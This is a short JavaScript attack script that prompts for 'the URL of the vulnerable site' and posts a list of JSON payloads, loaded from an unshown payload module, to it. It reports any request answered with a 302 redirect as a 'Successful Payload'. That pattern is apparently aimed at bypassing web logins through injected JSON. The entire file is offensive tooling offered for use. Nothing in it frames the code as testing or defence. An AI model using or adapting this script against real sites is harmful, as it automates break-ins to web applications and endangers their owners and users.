import { Payload } from './payload/payload.js';
import axios from 'axios';
import PromptSync from 'prompt-sync';

const prompt = PromptSync();
const url = prompt('Enter the URL of the vulnerable site: ');

const axiosInstance = axios.create()
axiosInstance.defaults.headers.post['Content-Type'] = 'application/json';
axiosInstance.defaults.maxRedirects = 0;
axiosInstance.interceptors.response.use(
    (response) => {
        return `Failed Payload:  + ${response.config.data}
        Status: ${response.status}`
    },
    (error) => {
        if (error.response.status === 302) {
            return `Successful Payload:  + ${error.config.data}
            \tLocation: ${url + error.response.headers.location}
            \tStatus: ${error.response.status}`
        } else {
            return `Failed Payload:  + ${error.response.config.data}
            Status: ${error.response.status}`
        }
    }
);

const attack = async () => {
    // Send requests with payloads in JSON
    Payload.inJson.forEach(async (payload) => {
        console.log(`Attempting attack:\n ${await axiosInstance.post(url, payload)}\n`)
    });
};

attack();